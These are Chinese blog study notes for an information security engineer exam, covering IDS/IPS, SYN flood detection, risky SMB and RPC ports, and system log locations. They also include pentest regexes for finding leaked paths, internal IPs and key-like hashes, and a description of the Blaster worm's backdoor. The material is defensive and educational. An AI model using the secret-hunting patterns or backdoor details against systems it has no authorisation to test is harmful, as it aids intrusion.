<h2 id="wireshark分析"><a href="#wireshark分析" class="headerlink" title="wireshark分析"></a>wireshark分析</h2><p>试题五</p>
<p>阅读下列说明和图，回答问题1至问题5，将解答写在答题纸的对应栏内。</p>
<p>【说明】</p>
<p>入侵检测系统（IDS）和入侵防护系统（IPS）是两种重要的网络安全防御手段，IDS注重的是网络安全状况的监管，IPS则注重对入侵行为的控制。</p>
<p>【问题1】（2分）</p>
<p>网络安全防护可以分为主动防护和被动防护，请问IDS和IPS分别属于哪种防护？</p>
<p>【问题2】（4分）</p>
<p>入侵检测是动态安全模型(P2DR)的重要组成部分。请列举P2DR模型的4个主要组成部分。</p>
<p>【问题3】（2分）</p>
<p>假如某入侵检测系统记录了如图5-1所示的网络数据包:</p>
<p>图5-1</p>
<p><img src="/../image/Soft-exam-intermediate/after/wireshark.png"></p>
<p>请问图中的数据包属于哪种网络攻击？该攻击的具体名字是什么？</p>
<p>【问题4】（4分）</p>
<p>入侵检测系统常用的两种检测技术是异常检测和误用检测，请问针对图中所描述的网络攻击应该采用哪种检测技术？请简要说明原因。</p>
<p>【问题5】（3分）</p>
<p>Snort是一款开源的网络入侵检测系统，它能够执行实时流量分析和IP协议网络的数据包记录。</p>
<p>Snort的配置有3种模式，请给出这3种模式的名字。</p>
<h6 id="试题分析-3"><a href="#试题分析-3" class="headerlink" title="试题分析"></a>试题分析</h6><p>【问题1】（2分）</p>
<p>入侵检测技术（IDS）注重的是网络安全状况的监管，通过监视网络或系统资源，寻找违反安全策略的行为或攻击迹象，并发出报警。因此绝大多数 IDS 系统都是被动的。</p>
<p>入侵防护系统（IPS） 则倾向于提供主动防护，注重对入侵行为的控制。其设计宗旨是预先对入侵活动和攻击性网络流量进行拦截，避免其造成损失。</p>
<p>【问题2】（4分）</p>
<p>5天修炼，5.4.2 入侵检测与入侵防护。</p>
<p>P2DR模型是基于静态模型之上的动态安全模型，该模型包含防护、检测、响应三个部分之外，还包含安全策略。</p>
<p>【问题3】（2分）</p>
<p>略</p>
<p>【问题4】（4分）</p>
<p>（1）异常检测</p>
<p>异常检测（也称基于行为的检测）是指把用户习惯行为特征存储在特征库中，然后将用户当前行为特征与特征数据库中的特征进行比较，若两者偏差较大，则认为有异常情况发生。</p>
<p>（2）误用检测</p>
<p>误用检测一般是由计算机安全专家首先对攻击情况和系统漏洞进行分析和分类，然后手工的编写相应的检测规则和特征模型。误用入侵检测的主要假设是具有能够被精确地按某种方式编码的攻击，并可以通过捕获攻击及重新整理，确认入侵活动是基于同一弱点进行攻击的入侵方法的变种。</p>
<p>SYN FLOOD攻击具有固定的攻击行为，攻击特征明显，所以可以使用误用检测的方法进行检测。</p>
<p>【问题5】（3分）</p>
<p>Snort的配置有3个主要模式：嗅探、包记录和网络入侵检测。</p>
<p>参考答案</p>
<p>【问题1】（2分）</p>
<p>入侵检测技术（IDS）属于被动防护；</p>
<p>入侵防护系统（IPS）提供主动防护。</p>
<p>【问题2】（4分）</p>
<p>防护、检测、响应、安全策略</p>
<p>【问题3】（2分）</p>
<p>拒绝服务攻击，SYN flood攻击。</p>
<p>【问题4】（4分）</p>
<p>\tSYN FLOOD攻击具有固定的攻击行为，攻击特征明显，所以可以使用误用检测的方法进行检测。</p>
<p>【问题5】（3分）</p>
<p>Snort的配置有3个主要模式：嗅探、包记录和网络入侵检测。</p>
<h2 id="拓扑图分析"><a href="#拓扑图分析" class="headerlink" title="拓扑图分析"></a>拓扑图分析</h2><p>【问题1】（6分）</p>
<p>1、按照等级保护2. 0的要求，该虚拟化云平台的定级不应低于（1）级？需要每（2）年测评一次。</p>
<p>2、根据信安部门要求，需要针对虚拟化云平台进行等级测评，结合该数据中心网络拓扑图，需要购置相关安全设备。</p>
<p>针对要求点“应在关键网网络节点检测、防止或限制从外部或内部部发起的网络攻击行为”选购的设备是（3）；</p>
<p>针对要求点“应能对远程访问的用户行为、访问互联网的用户行为等单独进行行为审计和数据分析”选购的设备是（4）；</p>
<p>针对要求点“应对系统管理员进行身份鉴别，只允许其通过特定的命令或操作界面进行系统管理操作，并针对这些操作进行审计”选购的设备是（5）；</p>
<p>针对要求点“应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞”选购的设备是（6）。</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E6%8B%93%E6%89%91%E5%9B%BE1.png"></p>
<p>【问题1】（6分）</p>
<p>1、按照等级保护2. 0的要求，该虚拟化云平台的定级不应低于（1）级？需要每（2）年测评一次。</p>
<p>2、根据信安部门要求，需要针对虚拟化云平台进行等级测评，结合该数据中心网络拓扑图，需要购置相关安全设备。</p>
<p>针对要求点“应在关键网网络节点检测、防止或限制从外部或内部部发起的网络攻击行为”选购的设备是（3）；</p>
<p>针对要求点“应能对远程访问的用户行为、访问互联网的用户行为等单独进行行为审计和数据分析”选购的设备是（4）；</p>
<p>针对要求点“应对系统管理员进行身份鉴别，只允许其通过特定的命令或操作界面进行系统管理操作，并针对这些操作进行审计”选购的设备是（5）；</p>
<p>针对要求点“应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞”选购的设备是（6）。</p>
<h2 id="常见危险端口"><a href="#常见危险端口" class="headerlink" title="常见危险端口"></a>常见危险端口</h2><table>
<thead>
<tr>
<th>端口号</th>
<th>协议</th>
<th>服务名称</th>
<th>功能说明</th>
<th>开放后的危险描述</th>
<th>被攻击或滥用时的典型特征</th>
</tr>
</thead>
<tbody><tr>
<td><strong>135</strong></td>
<td>TCP &#x2F; UDP</td>
<td>RPC Endpoint Mapper（远程过程调用）</td>
<td>用于定位 Windows 系统中 RPC 服务的动态端口，是 DCOM、WMI、远程服务调用等的基础</td>
<td>被利用进行 <strong>远程命令执行</strong>（如 MS03-026、MS08-067 等漏洞），攻击者可远程执行任意代码或控制主机；勒索病毒常用此端口扫描横向传播</td>
<td>网络中出现对 135 端口的大量扫描；防火墙日志中频繁有 “MSRPC” 请求；系统 RPCSS 服务异常消耗 CPU</td>
</tr>
<tr>
<td><strong>137</strong></td>
<td>UDP</td>
<td>NetBIOS Name Service</td>
<td>负责将计算机名解析为 IP 地址（早期局域网主机发现）</td>
<td>泄露主机名、工作组名、NetBIOS 名称等信息；可被用于 <strong>主机枚举、信息收集</strong>，甚至名称欺骗（NetBIOS spoofing）</td>
<td>出现异常 UDP 137 请求；网络嗅探可见主机名广播；局域网内频繁广播 NBNS 包</td>
</tr>
<tr>
<td><strong>138</strong></td>
<td>UDP</td>
<td>NetBIOS Datagram Service</td>
<td>提供广播消息及无连接数据报服务，用于 LAN 内共享发现</td>
<td>攻击者可利用其做 <strong>局域网嗅探、共享枚举、欺骗攻击</strong>；广播包会泄露设备信息</td>
<td>网络广播频繁；可见大量 UDP 138 流量；攻击中常出现 NB-Datagram 包</td>
</tr>
<tr>
<td><strong>139</strong></td>
<td>TCP</td>
<td>NetBIOS Session Service</td>
<td>建立有连接会话以进行文件、打印共享等操作（SMB over NetBIOS）</td>
<td>可被攻击者通过 <strong>空会话（Null Session）连接</strong> 或 弱口令爆破访问共享文件；也常被用于 SMB relay 攻击、横向移动</td>
<td>局域网中出现 TCP 139 会话请求；可用 <code>net use</code>、<code>smbclient</code> 等直接访问共享；攻击日志中显示匿名访问尝试</td>
</tr>
<tr>
<td><strong>445</strong></td>
<td>TCP</td>
<td>SMB（Server Message Block） &#x2F; CIFS</td>
<td>现代 SMB 协议直接运行在 TCP 上（不依赖 NetBIOS），用于文件共享、IPC、远程管理</td>
<td><strong>勒索病毒最常利用的端口</strong>：WannaCry、NotPetya、EternalBlue 等均利用 SMBv1 漏洞通过 445 扩散；也可被用于 SMB relay、凭证嗅探、横向传播</td>
<td>局域网中爆发异常 SMB 流量；主机之间相互访问 445；出现文件共享自动创建&#x2F;修改、勒索文件加密迹象</td>
</tr>
</tbody></table>
<h2 id="常见日志路径"><a href="#常见日志路径" class="headerlink" title="常见日志路径"></a>常见日志路径</h2><h5 id="Linux-用户登录与行为日志"><a href="#Linux-用户登录与行为日志" class="headerlink" title="Linux 用户登录与行为日志"></a>Linux 用户登录与行为日志</h5><table>
<thead>
<tr>
<th align="left">日志文件</th>
<th align="left">绝对路径</th>
<th align="left">特点</th>
<th align="left">功能描述</th>
<th align="left">查看命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>lastlog</strong></td>
<td align="left"><code>/var/log/lastlog</code></td>
<td align="left"><strong>二进制格式</strong>，记录所有用户的最近登录时间。</td>
<td align="left"><strong>用户登录时间审计</strong>：快速查看每个用户最后一次成功登录系统的时间。</td>
<td align="left"><code>lastlog</code></td>
</tr>
<tr>
<td align="left"><strong>btmp</strong></td>
<td align="left"><code>/var/log/btmp</code></td>
<td align="left"><strong>二进制格式</strong>，记录<strong>失败</strong>的登录尝试。</td>
<td align="left"><strong>安全监控</strong>：记录所有失败的登录尝试，用于检测暴力破解等安全威胁。</td>
<td align="left"><code>lastb</code></td>
</tr>
<tr>
<td align="left"><strong>utmp</strong></td>
<td align="left"><code>/var/run/utmp</code></td>
<td align="left"><strong>二进制格式</strong>，记录<strong>当前</strong>登录用户会话。</td>
<td align="left"><strong>当前用户会话监控</strong>：记录当前登录系统的用户信息，是 <code>who</code>, <code>w</code> 等命令的数据源。</td>
<td align="left"><code>who</code>, <code>w</code>, <code>users</code></td>
</tr>
<tr>
<td align="left"><strong>wtmp</strong></td>
<td align="left"><code>/var/log/wtmp</code></td>
<td align="left"><strong>二进制格式</strong>，记录所有的登录、注销历史。</td>
<td align="left"><strong>用户登录历史审计</strong>：记录所有用户的登录、注销、重启事件，可用于追溯用户活动。</td>
<td align="left"><code>last</code></td>
</tr>
<tr>
<td align="left"><strong>utmpx</strong> <strong>wtmpx</strong></td>
<td align="left"><code>/var/log/utmpx</code> <code>/var/log/wtmpx</code></td>
<td align="left"><strong>扩展格式</strong>（在某些Unix系统中，如Solaris）。</td>
<td align="left">功能同utmp&#x2F;wtmp，但提供更详细的信息。<strong>注意</strong>：在大多数Linux发行版中，主要使用utmp和wtmp。</td>
<td align="left">系统相关</td>
</tr>
</tbody></table>
<h5 id="Linux-服务与命令审计日志"><a href="#Linux-服务与命令审计日志" class="headerlink" title="Linux 服务与命令审计日志"></a>Linux 服务与命令审计日志</h5><table>
<thead>
<tr>
<th align="left">绝对路径</th>
<th align="left">特点</th>
<th align="left">功能描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/var/log/messages</code></td>
<td align="left">历史遗留名称，在许多系统（如RHEL&#x2F;CentOS 7）中是<strong>核心系统日志</strong>。记录内核、服务等广泛信息。</td>
<td align="left"><strong>通用系统活动记录</strong>：包含系统启动、服务状态变化、硬件检测、非关键错误等信息。是排查系统级问题的首选。</td>
</tr>
<tr>
<td align="left"><code>/var/log/syslog</code></td>
<td align="left">在 Debian&#x2F;Ubuntu 等系统中充当核心系统日志的角色，功能类似 <code>/var/log/messages</code>。</td>
<td align="left"><strong>通用系统活动记录</strong>：记录除身份验证外的大部分系统级日志。</td>
</tr>
<tr>
<td align="left"><code>/var/log/auth.log</code> <code>/var/log/secure</code></td>
<td align="left"><strong>身份验证和安全相关日志</strong>。 - <code>auth.log</code> (Debian&#x2F;Ubuntu) - <code>secure</code> (RHEL&#x2F;CentOS)</td>
<td align="left"><strong>用户登录&#x2F;认证审计</strong>：记录所有用户的登录、注销、sudo提权、SSH登录成功&#x2F;失败等安全事件。是安全审计的关键。</td>
</tr>
<tr>
<td align="left"><code>/var/log/kern.log</code></td>
<td align="left"><strong>内核专用日志</strong>。记录内核产生的信息，包括硬件驱动、内核模块加载&#x2F;卸载等。</td>
<td align="left"><strong>内核问题诊断</strong>：用于排查硬件兼容性、内核崩溃、驱动故障等问题。</td>
</tr>
<tr>
<td align="left"><code>/var/log/boot.log</code></td>
<td align="left"><strong>系统启动过程日志</strong>。记录本次开机启动过程中各个服务的启动状态。</td>
<td align="left"><strong>启动故障排查</strong>：当系统启动失败或服务未能正常启动时，查看此日志。</td>
</tr>
<tr>
<td align="left"><code>/var/log/dmesg</code></td>
<td align="left"><strong>内核环形缓冲区日志</strong>。内容与 <code>dmesg</code> 命令相同，但会持久化到磁盘。</td>
<td align="left"><strong>硬件和设备信息</strong>：记录系统启动时检测到的硬件信息，以及运行过程中的硬件错误（如USB设备故障、磁盘错误）。</td>
</tr>
<tr>
<td align="left"><code>/var/log/cron</code></td>
<td align="left"><strong>计划任务日志</strong>。记录 <code>cron</code> 和 <code>anacron</code> 任务的执行情况。</td>
<td align="left"><strong>定时任务监控</strong>：查看定时任务是否按时执行、执行结果（成功或错误输出）。</td>
</tr>
<tr>
<td align="left"><code>/var/log/maillog</code></td>
<td align="left"><strong>邮件服务日志</strong>。记录邮件系统（如Postfix, Sendmail）的收发信活动。</td>
<td align="left"><strong>邮件服务调试</strong>：用于排查邮件发送&#x2F;接收失败的问题。</td>
</tr>
<tr>
<td align="left"><code>/var/log/httpd/</code> <code>/var/log/apache2/</code></td>
<td align="left"><strong>Apache Web服务器日志目录</strong>。 - <code>access_log</code>：访问日志 - <code>error_log</code>：错误日志</td>
<td align="left"><strong>网站访问分析</strong>：记录所有HTTP请求，用于分析流量、访客行为。 <strong>Web服务错误诊断</strong>：记录Apache服务运行中的错误、PHP致命错误等。</td>
</tr>
<tr>
<td align="left"><code>/var/log/nginx/</code></td>
<td align="left"><strong>Nginx Web服务器日志目录</strong>。 - <code>access.log</code>：访问日志 - <code>error.log</code>：错误日志</td>
<td align="left">功能同Apache，记录Nginx的访问和错误信息。</td>
</tr>
<tr>
<td align="left"><code>/var/log/apt/</code></td>
<td align="left"><strong>APT包管理器日志目录</strong>。<code>history.log</code> 和 <code>term.log</code> 最为有用。</td>
<td align="left"><strong>软件包管理历史</strong>：记录所有通过 <code>apt</code> 进行的软件包安装、更新、删除操作，便于回溯。</td>
</tr>
</tbody></table>
<h5 id="windows常见日志"><a href="#windows常见日志" class="headerlink" title="windows常见日志"></a>windows常见日志</h5><table>
<thead>
<tr>
<th align="left">绝对路径</th>
<th align="left">特点</th>
<th align="left">功能描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>C:\Windows\System32\winevt\Logs\</code></td>
<td align="left"><strong>事件查看器日志文件存储目录</strong>。日志为二进制的 <code>.evtx</code> 格式，需用事件查看器或 <code>Get-WinEvent</code> PowerShell命令解析。</td>
<td align="left"><strong>所有Windows系统、应用程序和服务日志的集中存储位置</strong>。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\System32\winevt\Logs\System.evtx</code></td>
<td align="left"><strong>系统组件日志</strong>。记录由Windows操作系统组件（如驱动、系统服务）产生的事件。</td>
<td align="left"><strong>系统稳定性诊断</strong>：查看硬件错误、服务启动失败、驱动程序崩溃、蓝屏相关事件等。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\System32\winevt\Logs\Application.evtx</code></td>
<td align="left"><strong>应用程序日志</strong>。记录由用户应用程序或非系统程序产生的事件。</td>
<td align="left"><strong>应用程序问题排查</strong>：查看软件安装错误、程序崩溃、应用程序特定的错误和警告。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\System32\winevt\Logs\Security.evtx</code></td>
<td align="left"><strong>安全审计日志</strong>。记录所有与安全相关的事件，如登录、对象访问、权限变更等。默认部分审计策略未开启。</td>
<td align="left"><strong>安全审计与入侵检测</strong>：监控成功&#x2F;失败的登录尝试、用户权限变更、文件访问审计、策略更改等。是安全调查的核心。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\System32\winevt\Logs\Setup.evtx</code></td>
<td align="left"><strong>系统安装日志</strong>。记录在系统安装或更新过程中发生的事件。</td>
<td align="left"><strong>系统安装&#x2F;更新问题排查</strong>。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\System32\winevt\Logs\ForwardedEvents.evtx</code></td>
<td align="left"><strong>转发事件日志</strong>。用于存储从其他计算机转发过来的事件。</td>
<td align="left"><strong>集中式日志管理</strong>。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\Logs\</code></td>
<td align="left">一些Windows组件和功能的独立日志目录。</td>
<td align="left">包含一些更具体的日志，如：</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\Logs\CBS\CBS.log</code></td>
<td align="left"><strong>组件基于服务的堆栈日志</strong>。非常详细且庞大。</td>
<td align="left"><strong>Windows更新失败排查</strong>：当Windows Update失败时，这是最关键的日志，记录了每个更新组件的处理过程。</td>
</tr>
<tr>
<td align="left"><code>C:\Windows\Logs\DISM\dism.log</code></td>
<td align="left"><strong>部署映像服务和管理工具日志</strong>。</td>
<td align="left"><strong>系统映像处理问题排查</strong>：在使用DISM工具修复系统映像时查看。</td>
</tr>
<tr>
<td align="left"><code>%SystemRoot%\System32\Winevt\Logs\</code></td>
<td align="left">同上，使用了环境变量。</td>
<td align="left">与 <code>C:\Windows\System32\winevt\Logs\</code> 是同一个目录。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Information Security Engineer</category>
      </categories>
      <tags>
        <tag>Error correcting</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试的简单排查</title>
    <url>/2025/09/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B0%B4%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	渗透测试中包含太多重复且单一的漏洞排查，记录排查过程中的心得，以便之后可以快速进行排查缺陷，所采用的方法是正则匹配</p>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">含义与作用</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>[]</strong></td>
<td align="left"><strong>匹配内部所有字符</strong></td>
<td align="left">[a-z]</td>
</tr>
<tr>
<td align="left"><strong>\d</strong></td>
<td align="left"><strong>匹配任意一个数字</strong>。等价于 <code>[0-9]</code></td>
<td align="left"><code>\d\d</code> 匹配 <code>&quot;12&quot;</code>, <code>&quot;01&quot;</code>，但不匹配 <code>&quot;A1&quot;</code> (因为 A 不是数字)</td>
</tr>
<tr>
<td align="left"><strong>\w</strong></td>
<td align="left"><strong>匹配任意一个字母、数字或下划线</strong>。等价于 <code>[A-Za-z0-9_]</code></td>
<td align="left"><code>\w\w</code> 匹配 <code>&quot;Ab&quot;</code>, <code>&quot;a1&quot;</code>, <code>&quot;_x&quot;</code>，但不匹配 <code>&quot;@#&quot;</code></td>
</tr>
<tr>
<td align="left"><strong>\s</strong></td>
<td align="left"><strong>匹配任意一个空白字符</strong>，包括空格、制表符(<code>\t</code>)、换行符(<code>\n</code>)等</td>
<td align="left"><code>a\sb</code> 匹配 <code>&quot;a b&quot;</code> (中间有空格)</td>
</tr>
<tr>
<td align="left"><strong>\D</strong></td>
<td align="left"><strong>匹配任意一个非数字字符</strong>。等价于 <code>[^0-9]</code></td>
<td align="left"><code>\D</code> 匹配 <code>&quot;a&quot;</code>, <code>&quot;@&quot;</code>，但不匹配 <code>&quot;1&quot;</code></td>
</tr>
<tr>
<td align="left"><strong>\W</strong></td>
<td align="left"><strong>匹配任意一个非字母、数字、下划线的字符</strong>。等价于 <code>[^A-Za-z0-9_]</code></td>
<td align="left"><code>\W</code> 匹配 <code>&quot;@&quot;</code>, <code>&quot;+&quot;</code>，但不匹配 <code>&quot;a&quot;</code> 或 <code>&quot;1&quot;</code></td>
</tr>
<tr>
<td align="left"><strong>\S</strong></td>
<td align="left"><strong>匹配任意一个非空白字符</strong></td>
<td align="left"><code>\S</code> 匹配 <code>&quot;a&quot;</code>, <code>&quot;1&quot;</code>，但不匹配空格</td>
</tr>
<tr>
<td align="left"><strong>+</strong></td>
<td align="left"><strong>匹配前面的元素一次或多次</strong></td>
<td align="left">用于贪婪模式，不包含0次</td>
</tr>
<tr>
<td align="left">*****</td>
<td align="left"><strong>匹配前面的元素零次或多次</strong></td>
<td align="left">用于贪婪模式，包含0次</td>
</tr>
<tr>
<td align="left"><strong>?</strong></td>
<td align="left"><strong>匹配前面的元素零次或一次</strong></td>
<td align="left">用于非贪婪模式，只包含0和1次</td>
</tr>
<tr>
<td align="left"><strong>{n,m}</strong></td>
<td align="left"><strong>匹配前面的元素至少 n 次，至多 m 次</strong></td>
<td align="left"><code>a&#123;2,4&#125;</code> 匹配 <code>&quot;aa&quot;</code>, <code>&quot;aaa&quot;</code>, <code>&quot;aaaa&quot;</code></td>
</tr>
</tbody></table>
<p>只有在特定的组合中，<code>!</code> 可能参与构成有特殊意义的序列：</p>
<ul>
<li><code>(?!)</code> - 否定型先行断言（但通常写作 <code>(?!...)</code>）</li>
<li><code>(?&lt;!)</code> - 否定型后发断言（但通常写作 <code>(?&lt;!...)</code>）</li>
</ul>
<span id="more"></span>

<h1 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1-信息泄露"></a>1-信息泄露</h1><h3 id="1-绝对地址泄露"><a href="#1-绝对地址泄露" class="headerlink" title="1&gt;绝对地址泄露"></a>1&gt;绝对地址泄露</h3><p>浏览器正则匹配，最好采用<strong>贪婪模式</strong>进行排查	</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#windows-address</span><br><span class="line">[\W\s][A-Z]:[\/\\]+(\w&#123;<span class="number">2</span>,&#125;)+</span><br><span class="line">#注：浏览器中有忽略大小写，根据相应项目进行适当调整</span><br><span class="line"></span><br><span class="line">#当内容过多可以采用</span><br><span class="line">#否定型先行断言（Lookahead）- 排除后面括号的内容</span><br><span class="line">([\W\s][A-Z]:[\/\\]+(\w&#123;<span class="number">2</span>,&#125;)+)(?![\\d\\])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#/-address</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-内网地址泄露"><a href="#2-内网地址泄露" class="headerlink" title="2&gt;内网地址泄露"></a>2&gt;内网地址泄露</h3><p>主要匹配常见的192、172和127地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#net-address</span><br><span class="line">\b(?:127\.|192\.168\.|10\.|172\.(?:1[6-9]|2[0-9]|3[0-1])\.)(?:\d&#123;1,3&#125;\.)&#123;1,2&#125;\d&#123;1,3&#125;\b</span><br></pre></td></tr></table></figure>





<h3 id="3-哈希匹配"><a href="#3-哈希匹配" class="headerlink" title="3&gt;哈希匹配"></a>3&gt;哈希匹配</h3><p>主要匹配</p>
<p><code>abc123def456ghi789jkl012mno345pqr678stu901vwx234yz</code></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">#publickey</span><br><span class="line">&quot;(?=.*[0-9])(?=.*[a-z])[a-z0-9]&#123;50,&#125;&quot;</span><br><span class="line"></span><br><span class="line">#哈希匹配，改变后面的最少数字用于匹配密钥或者加密密码等</span><br><span class="line">:&quot;(?=.*[0-9])(?=.*[a-z])[a-z0-9]&#123;39,&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Article</category>
      </categories>
      <tags>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title>软考中级纠错记录-选择题</title>
    <url>/2025/09/05/%E8%BD%AF%E8%80%83%E4%B8%AD%E7%BA%A7%E7%BA%A0%E9%94%99%E8%AE%B0%E5%BD%95-%E4%B8%8A%E5%8D%8A/</url>
    <content><![CDATA[<h1 id="0-基础题"><a href="#0-基础题" class="headerlink" title="0-基础题"></a>0-基础题</h1><p>错题记录（上半场题目）—软考中级（信息安全工程师）</p>
<span id="more"></span>

<p>1、计算机信息系统安全保护等级从低到高分为：用户自主保护级、系统审计保护级、安全标注保护级、结构化保护级、访问验证保护级</p>
<p>2、隐私保护不当：收集的个人信息因为保护算法缺少等策略问题被被别人非法得到了</p>
<p>3、网络流量不可控：信息部署在第三方平台，传输过程中的流量被获取</p>
<p>4、病毒案例</p>
<p><img src="/../image/Soft-exam-intermediate/%E7%97%85%E6%AF%92%E6%A1%88%E4%BE%8B.png"></p>
<p>5、Kerberos 由美国麻省理工学院(MIT)研制实现，已经历了五个版本的发展。一个Kerberos系统涉及四个基本实体:<br>(1)Kerberos 客户机，用户用来访问服务器设备;<br>(2)AS (Authentication Server,认证服务器)，识别用户身份并提供TGS 会话密钥;<br>(3)TGS (Ticket Granting Server,票据发放服务器)，为申请服务的用户授予票据(Ticket);</p>
<p>(4)应用服务器(Application Server)，为用户提供服务的设备或系统。</p>
<p>其中，通常将AS 和TGS 统称为KDC(Key Distribution Center)</p>
<p>6、《信息安全技术ICT 供应链安全风险管理指南》描述:ICT是Infommation and Communication Technology的缩写。ICT 供应链风,险管理的主要目标如下:·完整性。确保在ICT 供应链的所有环节中，产品、系统、服务及其所包含的组件、部件、元器件、数据等不被植入、篡改、替换和伪造。<br>保密性。在确保ICT 供应链上传递的信息不被泄露给未授权者,<br>可用性。确保需方对ICT 供应链的使用不会被不合理地拒绝。<br>可控性。可控性是指需方对ICT 产品、服务或供应链的控制能力。<br>ICT 供应链主要面临恶意篡改、假冒伪劣、供应中断、信息泄露或违规操作和其他威胁五类安全威胁。</p>
<p>7、NAT是Network Address Translation的英文缩写，中文含义是“网络地址转换”。NAT技术主要是为了解决公开地址不足而出现的,它可以缓解少量因特网IP地址和大量主机之间的矛盾。实现网络地址转换的方式主要有:静态NAT(StaticNAT)、NAT池(pooledNAT)和端囗NAT(PAT)三种类型。<br>其中静态NAT设置起来最为简单，内部网络中的每个主机都被永久映射成外部网络中的某个合法的地址。而NAT池则是在外部网络中配置合法地址集，采用动态分配的方法映射到内部网络。PAT则是把内部地址映射到外部网络的一个iP地址的不同端口上。</p>
<p>8、安全事件</p>
<p><img src="/../image/Soft-exam-intermediate/%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6.png"></p>
<p>9、目前，隐私保护的常见技术措施有抑制、泛化、置换、扰动、裁剪等。其中抑制是通过将数据置空的方式限制数据发布;<br>泛化是通过降低数据精度来提供匿名的方法，<br>置换方法改变数据的属主;<br>扰动是在数据发布时添加一定的噪声，包括数据增删、变换等，使攻击者无法区分真实数据和噪声数据，从而对攻击者造成干扰;裁剪是将敏感数据分开发布。</p>
<p>10、John the Ripper:密码破解工具，用于检査Unix&#x2F;Linux系统的弱囗令</p>
<p>LOphtCrack:密码破解工具，常用户破解Windows系统口令</p>
<p>11、运维安全审计产品的主要功能有字符会话审计、图形操作审计、数据库运维审计、文件传输审计、合规审计等</p>
<p>(1)字符会话审计，审计SSH、Telnet等协议的操作行为，审计内容包括访问起始和终止时间、用户名、用户IP、设备名称、设备IP、协议类型、危险等级和操作命令等。</p>
<p>(2)图形操作审计，审计RDP、VNC等远程桌面以及HTTP&#x2F;HTTPS协议的图形操作行为，审计内容包括访问起始和终止时间、用户名、用户IP、设备名称、设备IP、协议类型、危险等级和操作内容等。</p>
<p>(3)数据库运维审计，审计Oracle、MSSQLServer、IBMDB2、PostgreSQL等各主流数据库的操作行为，审计内容包括访问起始和终止时间、用户名、用户IP、设备名称、设备IP、协议类型、危险等级和操作内容等</p>
<p>(4)文件传输审计，审计FTP、SFTP等协议的操作行为，审计内容包括访问起始和终止时间、用户名、用户IP、设备名称、目标设备IP、协议类型、文件名称、危险等级和操作命令等。</p>
<p>(5)合规审计，根据上述审计内容，参照相关的安全管理制度，对运维操作进行合规检查，给出符合性审查</p>
<p>12、数字签名过程为:假设Alice需要签名发送一份电子合同文件给Bob。（签名放篡改）<br>Alice 的签名步骤如下:<br>第一步，Alice使用Hash函数将电子合同文件生成一个消息摘要;:第二步，Alice 使用自己的私钥，把消息摘要加密处理，形成一个数字签名:<br>第三步，Alice把电子合同文件和数字签名一同发送给Bob。<br>Bob收到Alice发送的电子合同文件及数字签名后,为确信电子合同文件是Alice所认可的，验证步骤如下:<br>第一步，Bob使用与Alice相同的Hash算法，计算所收到的电子合同文件的消息摘要:第二步，Bob使用Alice的公钥，解密来自Aice的加密消息摘要，恢复Alice原来的消息摘要:<br>第三步，Bob比较自己产生的消息摘要和恢复出来的消息摘要之间的异同。若两个消息摘要相同，则表明电子合同文件来自Alice。如果两个消息摘要的比较结果不一致，则表明电子合同文件已被篡改。</p>
<p>13、端口复用技术利用系统网络打开的端口(如25和139等)传送数据。</p>
<p>木马Executor用80端口传递控制信息和数据</p>
<p>BladeRunner、Doly Trojan、Fore、FTPTrojan、Larva、ebEx、WinCrash等木马复用21端口</p>
<p>Shtrilitz Stealth、Terminator、WinPC、WinSpy等木马复用25 端口。</p>
<p>14、VPN有多种实现技术,按照VPN在TCP&#x2F;IP协议层的实现方式,可以将其分为链路层VPN、网络层VPN、传输层VPN。<br>链路层VPN的实现方式:ATM、FrameRelay、多协议标签交换MPLS</p>
<p>网络层VPN的实现方式:受控路由过滤、隧道技术</p>
<p>传输层VPN:通过SSL来实现</p>
<p>15、W32.Blaster.Worm是一种利用DCOMRPC漏洞进行传播的网络蠕虫，其传播能力很强。感染蠕虫的计算机系统运行不稳定，系统会不断重启。并且该蠕虫还将对windowsupdate.com进行拒绝服务攻击，使得受害用户不能及时地得到这个漏洞的补丁。当W32.Blaster.Worm运行时，会进行以下操作。<br>(1)创建一个名为BILLY的互斥体。如果这个互斥体存在，蠕虫将放弃感染并退出。</p>
<p>(2)在注册表中添加下列键值:”windows auto update”&#x3D;”msblast.exe”，并且将其添加至:HKEY LOCAL MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun，这样就可以传懦虫在系统被重起的时候能够自动运行。<br>(3)蠕虫生成攻击IP地址列表，尝试去感染列表中的计算机，蠕虫对有DCOM RPC 漏洞的机器发起TCP135端口的连接，进行感染。<br>(4)在TCP4444端口绑定一个cmd.exe的后门。<br>(5)在UDPport 69口上进行监听。如果收到了一个请求，将把Msblast.exe发送给目标机器。</p>
